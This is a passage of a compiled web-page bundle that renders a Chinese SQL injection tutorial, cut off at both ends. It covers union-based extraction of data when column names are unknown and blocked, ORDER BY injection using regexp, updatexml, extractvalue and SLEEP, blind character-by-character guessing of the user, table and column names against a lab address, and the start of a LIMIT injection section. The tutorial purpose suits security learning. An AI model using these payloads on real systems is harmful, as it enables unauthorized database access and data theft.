",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"between")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x61")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x7a"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),";"),"    ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"//select database() between 'a' and 'z';")))),Object(t.b)("h3",{className:"__internal",id:"未知列名情况下的注入利用"},"未知列名情况下的注入利用",Object(t.b)("a",s({parentName:"h3"},{href:"#%E6%9C%AA%E7%9F%A5%E5%88%97%E5%90%8D%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("inlineCode",{parentName:"p"},"mysql"),"版本<5.0或在利用",Object(t.b)("inlineCode",{parentName:"p"},"SQL"),"注入的时候遇到了WAF；"),Object(t.b)("p",null,"安全狗3.5版本会直接拦截关键字",Object(t.b)("inlineCode",{parentName:"p"},"information_shema"),"；"),Object(t.b)("p",null,"从而无法获取数据表的列名，这时可以",Object(t.b)("strong",{parentName:"p"},"利用虚表获取数据"),"。"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"-"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"`"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"4"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"`")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"4"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"6")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," users",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--可以通过不停的修改列名1，2，3，4来提取数据( 改这个用反引号包裹的`4`)")))),Object(t.b)("p",null,Object(t.b)("a",s({parentName:"p"},{href:"https://nosec.org/home/detail/2245.html",target:"_blank"}),"参考文章")),Object(t.b)("h2",{className:"__internal",id:"order-by注入"},"Order-By注入",Object(t.b)("a",s({parentName:"h2"},{href:"#order-by%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"order by 注入是",Object(t.b)("inlineCode",{parentName:"p"},"SQL"),"注入中很常见的，被过滤的概率小；"),Object(t.b)("p",{parentName:"blockquote"},"可被用户控制的数据在order by 子句后边，即order参数可控。")),Object(t.b)("h3",{className:"__internal",id:"利用报错"},"利用报错",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("h3",{className:"__internal",id:"利用regexp"},"利用regexp",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8regexp","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"http://192.168.239.2:81/?order=(select+1+regexp+if(1=1,1,0x00)) 正常\nhttp://192.168.239.2:81/?order=(select+1+regexp+if(1=2,1,0x00)) 错误"))),Object(t.b)("h3",{className:"__internal",id:"利用updatexml"},"利用updatexml",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8updatexml","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"http://192.168.239.2:81/?order=updatexml(1,if(1=1,1,user()),1)  正确\nhttp://192.168.239.2:81/?order=updatexml(1,if(1=2,1,user()),1)  错误"))),Object(t.b)("h3",{className:"__internal",id:"利用extractvalue"},"利用extractvalue",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8extractvalue","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"http://192.168.239.2:81/?order=extractvalue(1,if(1=1,1,user())) 正确\nhttp://192.168.239.2:81/?order=extractvalue(1,if(1=2,1,user())) 错误"))),Object(t.b)("h3",{className:"__internal",id:"利用时间盲注"},"利用时间盲注",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%88%A9%E7%94%A8%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"FROM"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"SLEEP",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"test",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," 正常响应时间\n",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"FROM"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"SLEEP",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"test",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," sleep ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),"秒"))),Object(t.b)("h3",{className:"__internal",id:"数据猜解"},"数据猜解",Object(t.b)("a",s({parentName:"h3"},{href:"#%E6%95%B0%E6%8D%AE%E7%8C%9C%E8%A7%A3","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"以猜解user()即",Object(t.b)("inlineCode",{parentName:"p"},"root@localhost"),"为例子，由于只能一位一位猜解；"),Object(t.b)("p",null,"可以利用",Object(t.b)("inlineCode",{parentName:"p"},"SUBSTR"),",",Object(t.b)("inlineCode",{parentName:"p"},"SUBSTRING"),",",Object(t.b)("inlineCode",{parentName:"p"},"MID"),",以及",Object(t.b)("inlineCode",{parentName:"p"},"left"),"和",Object(t.b)("inlineCode",{parentName:"p"},"right"),"可以精准分割出每一位子串；"),Object(t.b)("p",null,"然后就是比较操作了可以利用",Object(t.b)("inlineCode",{parentName:"p"},"="),",",Object(t.b)("inlineCode",{parentName:"p"},"like"),",",Object(t.b)("inlineCode",{parentName:"p"},"regexp"),"等；"),Object(t.b)("p",null,"这里要注意",Object(t.b)("inlineCode",{parentName:"p"},"like"),"是不区分大小写；"),Object(t.b)("p",null,"通过以下可以得知user()第一位为",Object(t.b)("inlineCode",{parentName:"p"},"r"),",ascii码的16进制为0x72"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"http://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确\nhttp://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"猜解当前数据的表名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"regexp"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substring",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"table_name",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"information_schema",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"tables"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"where"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_schema",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"ddatabase",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x67"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x00"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"  正确\n",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"regexp"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substring",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"table_name",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"information_schema",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"tables"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"where"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_schema",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"ddatabase",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x66"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x00"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," 错误"))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"猜解指定表名中的列名")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"regexp"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substring",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"column_name",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"information_schema",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"columns"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"where"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_schema",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"ddatabase",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_name",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"d0x676f6f6473",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x69"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x00"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," 正常\n",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"?",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"order"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"regexp"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substring",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"concat",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"column_name",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"information_schema",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"columns"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"where"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_schema",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"ddatabase",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),"table_name",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"d0x676f6f6473",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"limit"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"+"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x68"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0x00"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," 错误"))),Object(t.b)("p",null,"然后结合Burp去猜解即可~（",Object(t.b)("a",s({parentName:"p"},{href:"https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html",target:"_blank"}),"参考文章"),"）"),Object(t.b)("h2",{className:"__internal",id:"limit-注入"},"limit 注入",Object(t.b)("a",s({parentName:"h2"},{href:"#limit-%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"先科普下limit的用法")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(t.b)("pre",s({parentName:"div"},{className:"language-text"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-text"}),"格式：\nlimit m,n\n--m是记录开始的位置，n是取n条数据\nlimit 0,1\n--从第一条开始，取一条数据"))),Object(t.b)("p",null,"（适用于5.0.0 < mysql < 5.6.6的版本）"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT")," field ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"FROM")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"table")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," id ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),">")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"0")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"ORDER")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"BY")," id ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"LIMIT")," （注入点）"))),Object(t.b)("p",null,"确认有注入点前面有 order by 关键字,没法用union"),Object(t.b)("p",null,"在LIMIT后面可以跟两个函数，PROCEDURE 和 